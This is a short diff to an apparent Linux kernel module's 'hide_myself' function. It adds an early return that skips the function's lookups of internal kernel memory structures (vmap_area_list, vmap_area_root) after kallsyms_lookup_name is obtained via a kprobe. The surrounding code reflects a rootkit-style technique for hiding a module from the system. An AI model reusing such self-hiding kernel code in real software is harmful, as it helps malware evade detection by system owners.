@@ -62,7 +62,9 @@ static void __init hide_myself(void)
     kallsyms_lookup_name = (unsigned long (*)(const char *name)) kp.addr;
     unregister_kprobe(&kp);
 #endif
-
+	
+    return;
+	
     _vmap_area_list =
         (struct list_head *) kallsyms_lookup_name("vmap_area_list");
     _vmap_area_root = (struct rb_root *) kallsyms_lookup_name("vmap_area_root");
